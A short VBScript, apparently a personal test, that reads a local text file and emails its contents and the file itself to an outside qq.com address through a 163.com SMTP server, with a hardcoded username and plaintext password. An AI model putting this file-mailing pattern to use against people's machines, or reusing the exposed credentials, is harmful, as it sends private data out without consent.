NameSpace="http://schemas.microsoft.com/cdo/configuration/"
set Email = CreateObject("CDO.Message")
Email.From = "gaovce@163.com" 
Email.To = "2975502691@qq.com" 
Email.Subject = "vbsTest" 
x="e:\info.txt" 
y="e:\info.txt"
Set fso=CreateObject("Scripting.FileSystemObject")
Set myfile=fso.OpenTextFile(x,1,Ture)
c=myfile.readall
myfile.Close
Email.Textbody = c
Email.AddAttachment y
with Email.Configuration.Fields
.Item(NameSpace&"sendusing") = 2
.Item(NameSpace&"smtpserver") = "smtp.163.com" 
.Item(NameSpace&"smtpserverport") = 25
.Item(NameSpace&"smtpauthenticate") = 1
.Item(NameSpace&"sendusername") = "gaovce" 
.Item(NameSpace&"sendpassword") = "12345678" 
.Update
end with
Email.Send
Set Email=Nothing
